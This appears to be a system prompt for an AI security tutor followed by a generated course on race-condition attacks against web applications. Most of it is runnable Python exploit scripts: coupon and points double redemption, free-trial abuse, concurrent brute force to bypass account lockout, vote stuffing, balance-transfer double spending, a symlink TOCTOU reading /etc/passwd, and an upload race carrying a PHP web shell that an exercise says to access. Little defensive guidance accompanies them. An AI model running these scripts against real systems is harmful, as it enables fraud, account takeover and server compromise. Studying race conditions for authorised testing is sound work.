You are an elite Race Conditions and Concurrency Issues Learning AI, specializing in teaching timing-dependent vulnerability assessment. Your expertise focuses on educating bug bounty hunters about TOCTOU flaws, concurrent request exploitation, and multi-threaded application security.

Your mission is to guide aspiring security researchers through race condition complexities, teaching them systematic approaches to testing timing vulnerabilities, identifying concurrency issues, and developing thread-safe implementations.

Key Learning Objectives:
- **TOCTOU Vulnerability Detection**: Master time-of-check-time-of-use flaw identification
- **Concurrent Request Analysis**: Learn simultaneous operation testing techniques
- **Resource Exhaustion**: Assess race-based resource consumption vulnerabilities
- **State Synchronization**: Test client-server state desynchronization opportunities
- **Locking Mechanism Review**: Evaluate improper use of locks and synchronization primitives
- **Atomic Operation Testing**: Verify atomicity of critical operations
- **Cache Race Conditions**: Test for cache-based race condition exploitation

Advanced Learning Concepts:
- **Request Timing Manipulation**: Use tools to send concurrent requests with precise timing
- **Burp Turbo Intruder**: Employ advanced concurrency testing tools
- **Custom Scripting**: Develop scripts to automate race condition testing
- **Timing Analysis**: Measure response times to identify race windows
- **State Desynchronization**: Manipulate client and server state inconsistencies
- **Resource Contention**: Test for race conditions in resource allocation
- **Database Race Conditions**: Assess concurrent database operations

Learning Process:
1. **Race Condition Fundamentals**: Understand timing vulnerability principles and concepts
2. **TOCTOU Analysis**: Learn time-of-check-time-of-use flaw identification
3. **Concurrency Testing**: Study simultaneous operation testing methodologies
4. **Resource Assessment**: Evaluate resource exhaustion through race conditions
5. **State Synchronization**: Test client-server state consistency issues
6. **Locking Mechanisms**: Assess synchronization primitive implementations
7. **Atomic Operations**: Verify critical operation atomicity

Teaching Methodology:
- **Race Labs**: Hands-on timing vulnerability testing exercises
- **TOCTOU Workshops**: Time-of-check-time-of-use flaw identification training
- **Concurrency Testing**: Simultaneous operation testing technique frameworks
- **Resource Analysis**: Race-based resource exhaustion assessment guides
- **State Synchronization**: Client-server state consistency testing exercises
- **Locking Assessment**: Synchronization primitive evaluation frameworks
- **Real-World Scenarios**: Case studies of race condition exploitation

Output Format:
- **Race Modules**: Structured learning units for timing vulnerability concepts
- **TOCTOU Exercises**: Practical time-of-check-time-of-use testing labs
- **Concurrency Labs**: Simultaneous operation testing technique frameworks
- **Resource Workshops**: Race-based resource exhaustion assessment guides
- **State Tutorials**: Client-server state consistency testing exercises
- **Locking Labs**: Synchronization primitive evaluation frameworks
- **Case Studies**: Real-world race condition vulnerability examples

Example Learning Query: "Teach me race condition and concurrency testing from basics to expert level"

Ensure learning materials are comprehensive, practical, and focused on developing expert-level timing vulnerability assessment skills.

---

# MODULE 1: Race Condition Fundamentals

## 1.1 What is a Race Condition?

A race condition occurs when the behavior of a system depends on the relative timing of events, such as the order in which threads or processes execute. When multiple operations access shared resources concurrently without proper synchronization, unintended behavior can occur.

**Vulnerable code example (PHP):**

```php
<?php
// Vulnerable: balance check and withdrawal are not atomic
$balance = getBalance($user_id);
if ($balance >= $amount) {
    // RACE WINDOW: Another request can withdraw here
    sleep(1); // Simulate processing delay
    withdraw($user_id, $amount);
    echo "Withdrawal successful";
} else {
    echo "Insufficient funds";
}
?>
```

**Vulnerable code example (Python/Flask):**

```python
from flask import Flask, request
import redis

app = Flask(__name__)
r = redis.Redis()

@app.route('/transfer')
def transfer():
    from_user = request.args.get('from')
    to_user = request.args.get('to')
    amount = int(request.args.get('amount'))
    
    # Vulnerable: non-atomic check and transfer
    balance = int(r.get(f'balance:{from_user}') or 0)
    if balance >= amount:
        # RACE WINDOW
        r.decrby(f'balance:{from_user}', amount)
        r.incrby(f'balance:{to_user}', amount)
        return 'Transfer successful'
    return 'Insufficient funds'
```

**Vulnerable code example (Node.js):**

```javascript
const express = require('express');
const app = express();

app.get('/withdraw', async (req, res) => {
    const userId = req.query.user;
    const amount = parseInt(req.query.amount);
    
    // Vulnerable: non-atomic check and withdrawal
    const balance = await getBalance(userId);
    if (balance >= amount) {
        // RACE WINDOW: Multiple requests can pass the check
        await withdraw(userId, amount);
        res.send('Withdrawal successful');
    } else {
        res.send('Insufficient funds');
    }
});
```

## 1.2 Race Condition Taxonomy

| Type | Description | Impact |
|------|-------------|--------|
| **Check-Then-Act** | Check condition, then act on it (TOCTOU) | Double spending, privilege escalation |
| **Time-of-Check to Time-of-Use (TOCTOU)** | Resource state changes between check and use | File access, privilege escalation |
| **Double Spending** | Same resource spent multiple times concurrently | Financial loss, coupon reuse |
| **Race on State** | Concurrent state modifications | Data corruption, inconsistent state |
| **Race on Authentication** | Concurrent auth state changes | Account takeover, session fixation |
| **Race on File Access** | Concurrent file operations | File corruption, path traversal |
| **Race on Resource Allocation** | Concurrent resource assignment | Resource exhaustion, denial of service |

## 1.3 Race Condition Impact

```
Financial Impact:
- Double spending / fund transfers
- Coupon/voucher reuse
- Loyalty points duplication
- Free tier exploitation

Security Impact:
- Privilege escalation
- Account takeover
- Authentication bypass
- Authorization bypass

Data Integrity Impact:
- Data corruption
- Inconsistent state
- Lost updates
- Phantom reads

Availability Impact:
- Denial of service
- Resource exhaustion
- Deadlocks
```

---

# MODULE 2: TOCTOU Vulnerabilities

## 2.1 File-Based TOCTOU

```python
import os
import time
import threading

def vulnerable_file_check(filename):
    """TOCTOU in file access"""
    # Check if file exists
    if os.path.exists(filename):  # CHECK
        # RACE WINDOW: Symlink could be created here
        time.sleep(0.01)
        with open(filename, 'r') as f:  # USE
            return f.read()
    return "File not found"

# Attack scenario:
# Thread 1: checks /tmp/userfile (exists, is regular file)
# Thread 2: replaces /tmp/userfile with symlink to /etc/passwd
# Thread 1: opens /tmp/userfile (now reads /etc/passwd)
```

**Exploitation script:**

```python
import os
import threading
import time

def create_symlink():
    """Continuously create/delete symlink"""
    while running:
        try:
            os.remove('/tmp/userfile')
        except:
            pass
        try:
            os.symlink('/etc/passwd', '/tmp/userfile')
        except:
            pass
        time.sleep(0.001)

def access_file():
    """Try to read the file"""
    for i in range(1000):
        try:
            with open('/tmp/userfile', 'r') as f:
                content = f.read()
                if 'root:' in content:
                    print(f"[+] Got /etc/passwd!")
                    break
        except:
            pass

running = True
t1 = threading.Thread(target=create_symlink)
t2 = threading.Thread(target=access_file)

t1.start()
t2.start()
t2.join()
running = False
t1.join()
```

## 2.2 Authentication TOCTOU

```python
import requests
import threading

def race_login(target_url, username, password):
    """Race condition in login/account creation"""
    
    results = []
    
    def attempt():
        data = {
            'username': username,
            'password': password,
            'email': f'{username}@evil.com'
        }
        response = requests.post(target_url, data=data)
        results.append(response.status_code)
    
    # Send many concurrent login attempts
    threads = [threading.Thread(target=attempt) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Analyze results
    print(f"Results: {results}")
    success_count = results.count(200)
    print(f"Successful: {success_count}")

# Usage
race_login("https://target.com/register", "testuser", "password123")
```

## 2.3 Price Check TOCTOU

```python
import requests
import threading

def race_price_check(target_url, product_id):
    """Race condition in price validation"""
    
    # Step 1: Add item to cart at original price
    session = requests.Session()
    session.post(f"{target_url}/cart/add", data={'product': product_id, 'qty': 1})
    
    # Step 2: Change price in one tab
    def change_price():
        session.post(f"{target_url}/admin/price", data={'product': product_id, 'price': 0.01})
    
    # Step 3: Checkout in another tab simultaneously
    def checkout():
        response = session.post(f"{target_url}/checkout")
        return response.text
    
    # Race the price change and checkout
    t1 = threading.Thread(target=change_price)
    t2 = threading.Thread(target=checkout)
    
    t1.start()
    t2.start()
    
    t1.join()
    t2.join()

# Usage
race_price_check("https://target.com", "product123")
```

---

# MODULE 3: Double Spending / Double Redemption

## 3.1 Coupon Code Race

```python
import requests
import threading
from concurrent.futures import ThreadPoolExecutor

def race_coupon(target_url, coupon_code, session_cookie):
    """Race condition to use coupon multiple times"""
    
    results = []
    
    def apply_coupon():
        session = requests.Session()
        session.cookies.set('session', session_cookie)
        response = session.post(f"{target_url}/coupon/apply", 
                               data={'code': coupon_code})
        results.append({
            'status': response.status_code,
            'success': 'success' in response.text.lower(),
            'response': response.text[:200]
        })
    
    # Send concurrent coupon applications
    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(apply_coupon) for _ in range(20)]
    
    # Analyze results
    successes = [r for r in results if r['success']]
    print(f"Total attempts: {len(results)}")
    print(f"Successful: {len(successes)}")
    
    if len(successes) > 1:
        print("[!] DOUBLE SPENDING - Coupon applied multiple times!")

# Usage
race_coupon("https://target.com", "DISCOUNT50", "YOUR_SESSION")
```

## 3.2 Loyalty Points Race

```python
import requests
import threading

def race_loyalty_points(target_url, action, session_cookie):
    """Race condition to earn points multiple times"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # Get initial points
    response = session.get(f"{target_url}/points")
    initial_points = int(response.text)
    
    results = []
    
    def redeem_action():
        resp = session.post(f"{target_url}/redeem", data={'action': action})
        results.append(resp.status_code)
    
    # Race to redeem multiple times
    threads = [threading.Thread(target=redeem_action) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Get final points
    response = session.get(f"{target_url}/points")
    final_points = int(response.text)
    
    points_earned = final_points - initial_points
    print(f"Points earned: {points_earned}")
    print(f"Expected: 1 per action")
    
    if points_earned > 1:
        print("[!] DOUBLE SPENDING - Points earned multiple times!")

# Usage
race_loyalty_points("https://target.com", "daily_checkin", "YOUR_SESSION")
```

## 3.3 Free Trial Abuse

```python
import requests
import threading

def race_free_trial(target_url, email):
    """Race condition to create multiple free trials"""
    
    results = []
    
    def create_trial():
        data = {
            'email': email,
            'password': 'password123'
        }
        resp = requests.post(f"{target_url}/trial/start", data=data)
        results.append(resp.status_code)
    
    # Race to create trials
    threads = [threading.Thread(target=create_trial) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    successes = [r for r in results if r == 200]
    print(f"Trials created: {len(successes)}")
    
    if len(successes) > 1:
        print("[!] MULTIPLE TRIALS - Free trial abused!")

# Usage
race_free_trial("https://target.com", "victim@email.com")
```

---

# MODULE 4: Race Condition in Authentication

## 4.1 Password Reset Race

```python
import requests
import threading

def race_password_reset(target_url, email):
    """Race condition in password reset flow"""
    
    # Step 1: Request multiple reset tokens simultaneously
    tokens = []
    
    def request_reset():
        resp = requests.post(f"{target_url}/password-reset/request", 
                           data={'email': email})
        tokens.append(resp.text)
    
    threads = [threading.Thread(target=request_reset) for _ in range(5)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Step 2: Check if multiple valid tokens were created
    print(f"Reset tokens received: {len(tokens)}")
    for i, token in enumerate(tokens):
        print(f"Token {i+1}: {token[:50]}...")
    
    # If multiple tokens are valid, old tokens aren't invalidated
    print("[!] Multiple tokens may be valid - old tokens not invalidated!")

# Usage
race_password_reset("https://target.com", "victim@email.com")
```

## 4.2 Account Lockout Race

```python
import requests
import threading

def race_bruteforce(target_url, username):
    """Race condition to bypass account lockout"""
    
    # If lockout is not atomic, we can try many passwords simultaneously
    passwords = ['password1', 'password2', 'password3', '123456', 'admin']
    
    results = []
    
    def attempt_login(password):
        resp = requests.post(f"{target_url}/login", 
                           data={'username': username, 'password': password})
        results.append({
            'password': password,
            'status': resp.status_code,
            'success': 'dashboard' in resp.text.lower() or resp.status_code == 302
        })
    
    # Send all attempts simultaneously
    threads = [threading.Thread(target=attempt_login, args=(p,)) for p in passwords]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Analyze results
    successes = [r for r in results if r['success']]
    if successes:
        print(f"[!] LOCKOUT BYPASS - Successful login: {successes[0]['password']}")
    else:
        print("[*] All attempts failed")

# Usage
race_bruteforce("https://target.com", "admin")
```

## 4.3 Session Fixation Race

```python
import requests
import threading

def race_session_fixation(target_url, victim_id):
    """Race condition in session management"""
    
    sessions = []
    
    def create_session():
        resp = requests.get(f"{target_url}/login")
        session_id = resp.cookies.get('session')
        sessions.append(session_id)
    
    # Create many sessions simultaneously
    threads = [threading.Thread(target=create_session) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Check if session IDs are predictable
    unique_sessions = set(sessions)
    print(f"Total sessions: {len(sessions)}")
    print(f"Unique sessions: {len(unique_sessions)}")
    
    if len(unique_sessions) < len(sessions):
        print("[!] SESSION COLLISION - Predictable session IDs!")

# Usage
race_session_fixation("https://target.com", "victim123")
```

---

# MODULE 5: Race Condition Detection Tools

## 5.1 Burp Suite Turbo Intruder

```python
# Burp Suite extension for race condition testing
# Install: Extender > BApp Store > Turbo Intruder

# Python script for Turbo Intruder
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Queue many identical requests
    for i in range(30):
        engine.queue(target.req, target.baseInput)
    
    # Send all requests simultaneously
    engine.openGate('attack')

def handleResponse(req, interesting):
    if req.status == 200 and 'success' in req.response:
        table.add(req)
```

## 5.2 Custom Python Race Condition Tester

```python
import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

class RaceConditionTester:
    def __init__(self, target_url, session_cookie):
        self.target_url = target_url
        self.session = requests.Session()
        self.session.cookies.set('session', session_cookie)
        self.results = []
        self.lock = threading.Lock()
    
    def send_request(self, method, path, data=None, headers=None):
        """Send a single request and record result"""
        start = time.time()
        try:
            if method == 'GET':
                response = self.session.get(f"{self.target_url}{path}", 
                                          headers=headers, timeout=10)
            elif method == 'POST':
                response = self.session.post(f"{self.target_url}{path}", 
                                           data=data, headers=headers, timeout=10)
            else:
                response = self.session.request(method, f"{self.target_url}{path}",
                                              json=data, headers=headers, timeout=10)
            
            elapsed = time.time() - start
            
            with self.lock:
                self.results.append({
                    'status': response.status_code,
                    'length': len(response.text),
                    'time': elapsed,
                    'response': response.text[:500],
                    'success': response.status_code == 200
                })
            
            return response
        except Exception as e:
            with self.lock:
                self.results.append({
                    'error': str(e),
                    'time': time.time() - start
                })
            return None
    
    def race_test(self, method, path, data=None, num_threads=20, headers=None):
        """Send concurrent requests and analyze results"""
        self.results = []
        
        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [
                executor.submit(self.send_request, method, path, data, headers)
                for _ in range(num_threads)
            ]
            
            for future in as_completed(futures):
                future.result()
        
        return self.analyze_results()
    
    def analyze_results(self):
        """Analyze race condition test results"""
        successful = [r for r in self.results if r.get('success')]
        failed = [r for r in self.results if not r.get('success') and 'error' not in r]
        errors = [r for r in self.results if 'error' in r]
        
        analysis = {
            'total_requests': len(self.results),
            'successful': len(successful),
            'failed': len(failed),
            'errors': len(errors),
            'race_detected': False
        }
        
        # Check for race condition indicators
        if len(successful) > 1:
            # Multiple successes might indicate race condition
            analysis['race_detected'] = True
            analysis['evidence'] = 'Multiple concurrent requests succeeded'
        
        # Analyze response times
        times = [r.get('time', 0) for r in self.results]
        if times:
            analysis['avg_response_time'] = sum(times) / len(times)
            analysis['max_response_time'] = max(times)
            analysis['min_response_time'] = min(times)
        
        return analysis

# Usage
tester = RaceConditionTester("https://target.com", "YOUR_SESSION_COOKIE")
results = tester.race_test('POST', '/coupon/apply', 
                          data={'code': 'DISCOUNT50'}, 
                          num_threads=20)
print(results)
```

## 5.3 Turbo Intruder Script for Race Conditions

```python
# Turbo Intruder race condition script
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=30,
                           requestsPerConnection=100,
                           pipeline=False)
    
    # Modify request to change email
    modified = target.req.replace(
        'old@email.com',
        'attacker@evil.com'
    )
    
    # Queue 50 identical requests
    for i in range(50):
        engine.queue(modified)
    
    # Send all at once
    engine.openGate('attack')

def handleResponse(req, interesting):
    table.add(req)
```

## 5.4 Race Condition with Delay

```python
import requests
import threading
import time

def race_with_delay(target_url, session_cookie, delay=0.1):
    """Test race condition with precise timing"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    results = []
    
    def delayed_request(i):
        time.sleep(delay * i)  # Stagger requests
        resp = session.post(f"{target_url}/action")
        results.append(resp.status_code)
    
    threads = [threading.Thread(target=delayed_request, args=(i,)) 
               for i in range(20)]
    
    start = time.time()
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    elapsed = time.time() - start
    print(f"Total time: {elapsed:.2f}s")
    print(f"Results: {results}")
    
    # Analyze for race conditions
    unique_results = set(results)
    if len(unique_results) > 1:
        print("[!] Race condition detected - mixed results!")

# Usage
race_with_delay("https://target.com", "YOUR_SESSION", delay=0.05)
```

---

# MODULE 6: Race Condition Exploitation Patterns

## 6.1 Double Spending on E-commerce

```python
import requests
import threading

def double_spend(target_url, session_cookie, product_id):
    """Double spend race condition on e-commerce"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # Step 1: Add item to cart
    session.post(f"{target_url}/cart/add", 
                data={'product': product_id, 'qty': 1})
    
    # Step 2: Race to checkout simultaneously
    checkout_results = []
    
    def checkout():
        resp = session.post(f"{target_url}/checkout")
        checkout_results.append({
            'status': resp.status_code,
            'success': 'order confirmed' in resp.text.lower() or 
                      'thank you' in resp.text.lower()
        })
    
    # Send concurrent checkout requests
    threads = [threading.Thread(target=checkout) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Analyze results
    successes = [r for r in checkout_results if r['success']]
    print(f"Checkout attempts: {len(checkout_results)}")
    print(f"Successful: {len(successes)}")
    
    if len(successes) > 1:
        print("[!] DOUBLE SPENDING - Multiple checkouts succeeded!")
        print("[!] Check if multiple orders were created with single payment")

# Usage
double_spend("https://target.com", "YOUR_SESSION", "product123")
```

## 6.2 Race on File Upload

```python
import requests
import threading

def race_file_upload(target_url, session_cookie):
    """Race condition in file upload processing"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # Upload legitimate image
    image_data = b'\xff\xd8\xff\xe0' + b'\x00' * 1000  # Fake JPEG
    
    # Upload malicious PHP
    php_data = b'<?php system($_GET["cmd"]); ?>'
    
    upload_results = []
    
    def upload_image():
        files = {'file': ('image.jpg', image_data, 'image/jpeg')}
        resp = session.post(f"{target_url}/upload", files=files)
        upload_results.append(resp.text)
    
    def upload_shell():
        files = {'file': ('shell.php', php_data, 'application/x-php')}
        resp = session.post(f"{target_url}/upload", files=files)
        upload_results.append(resp.text)
    
    # Race both uploads
    threads = []
    for _ in range(5):
        threads.append(threading.Thread(target=upload_image))
        threads.append(threading.Thread(target=upload_shell))
    
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Analyze results
    print("Upload results:")
    for i, result in enumerate(upload_results):
        print(f"  Attempt {i+1}: {result[:100]}")

# Usage
race_file_upload("https://target.com", "YOUR_SESSION")
```

## 6.3 Race on Balance Transfer

```python
import requests
import threading

def race_balance_transfer(target_url, session_cookie, from_account, to_account):
    """Race condition in balance transfer"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # Get initial balance
    resp = session.get(f"{target_url}/balance?account={from_account}")
    initial_balance = float(resp.text)
    print(f"Initial balance: {initial_balance}")
    
    # Race multiple transfers
    transfer_amount = 100
    
    def transfer():
        session.post(f"{target_url}/transfer", data={
            'from': from_account,
            'to': to_account,
            'amount': transfer_amount
        })
    
    threads = [threading.Thread(target=transfer) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Check final balance
    resp = session.get(f"{target_url}/balance?account={from_account}")
    final_balance = float(resp.text)
    print(f"Final balance: {final_balance}")
    
    expected = initial_balance - (1 * transfer_amount)
    actual = initial_balance - final_balance
    
    print(f"Expected spent: {expected}")
    print(f"Actual spent: {actual}")
    
    if actual > transfer_amount:
        print("[!] DOUBLE SPENDING - More transferred than expected!")

# Usage
race_balance_transfer("https://target.com", "YOUR_SESSION", "account1", "account2")
```

## 6.4 Race on Voting

```python
import requests
import threading

def race_voting(target_url, session_cookie, candidate_id):
    """Race condition in voting system"""
    
    session = requests.Session()
    session.cookies.set('session', session_cookie)
    
    # Get initial vote count
    resp = session.get(f"{target_url}/votes?id={candidate_id}")
    initial_votes = int(resp.text)
    print(f"Initial votes: {initial_votes}")
    
    # Race multiple vote submissions
    vote_results = []
    
    def vote():
        resp = session.post(f"{target_url}/vote", 
                           data={'candidate': candidate_id})
        vote_results.append(resp.status_code)
    
    threads = [threading.Thread(target=vote) for _ in range(20)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    
    # Check final vote count
    resp = session.get(f"{target_url}/votes?id={candidate_id}")
    final_votes = int(resp.text)
    votes_added = final_votes - initial_votes
    
    print(f"Votes added: {votes_added}")
    print(f"Successful responses: {vote_results.count(200)}")
    
    if votes_added > 1:
        print("[!] VOTE FRAUD - Multiple votes counted!")

# Usage
race_voting("https://target.com", "YOUR_SESSION", "candidate1")
```

---

# MODULE 7: Practical Exercises

## Exercise 1: Basic Race Condition Detection

**Target:** Detect a race condition in a coupon redemption system.

**Steps:**
1. Navigate to a coupon redemption page
2. Intercept the coupon redemption request
3. Send 20 concurrent requests using Turbo Intruder or Python
4. Check if the coupon was applied multiple times
5. Document the impact

## Exercise 2: Double Spending

**Target:** Exploit a race condition to double-spend on a product.

**Steps:**
1. Add an item to cart
2. Intercept the checkout request
3. Send 10 concurrent checkout requests
4. Check if multiple orders were created
5. Verify only one payment was processed

## Exercise 3: Account Lockout Bypass

**Target:** Bypass account lockout using race conditions.

**Steps:**
1. Attempt 3 wrong passwords (should trigger lockout)
2. Send 10 concurrent login attempts with different passwords
3. Check if any attempt succeeds
4. Verify the lockout mechanism is not atomic

## Exercise 4: File Upload Race

**Target:** Upload a malicious file using race conditions.

**Steps:**
1. Upload a legitimate image file
2. Simultaneously upload a PHP shell
3. Check if the PHP shell was accepted
4. Access the uploaded shell

## Exercise 5: Balance Transfer Race

**Target:** Double-spend using balance transfer race condition.

**Steps:**
1. Check account balance
2. Initiate 10 concurrent transfers
3. Check final balance
4. Verify if more was transferred than the balance allowed

---

# MODULE 8: Assessment Questions

## Beginner Level

1. What is a race condition and why is it dangerous?
2. What is TOCTOU and how does it relate to race conditions?
3. Name three common scenarios where race conditions occur.
4. What is double spending and how does it exploit race conditions?
5. How can race conditions affect authentication systems?

## Intermediate Level

6. Explain the difference between a race condition and a logic flaw.
7. How does improper locking lead to race conditions in databases?
8. What tools can be used to test for race conditions?
9. Describe how race conditions can be exploited in e-commerce applications.
10. How do race conditions affect distributed systems?

## Advanced Level

11. Explain a complete attack chain using race conditions to achieve account takeover.
12. How would you test for race conditions in a microservices architecture?
13. Describe the impact of race conditions on financial systems and how to mitigate them.
14. What are atomic operations and how do they prevent race conditions?
15. How would you chain race conditions with other vulnerabilities for maximum impact?

---

# MODULE 9: Further Reading

- **OWASP Race Conditions**: https://owasp.org/www-community/vulnerabilities/Race_Condition
- **PortSwigger Race Conditions**: https://portswigger.net/web-security/race-conditions
- **HackTricks Race Conditions**: https://book.hacktricks.xyz/pentesting-web/race-condition
- **Turbo Intruder**: https://github.com/PortSwigger/turbo-intruder
- **Race condition exploitation**: https://blog.assetnote.io/2020/11/15/race-conditions/
- **Double spending attacks**: https://en.wikipedia.org/wiki/Double_spend
- **TOCTOU vulnerabilities**: https://cwe.mitre.org/data/definitions/367.html
- **Real-world race conditions**: Filter HackerOne/Bugcrowd reports for "race condition"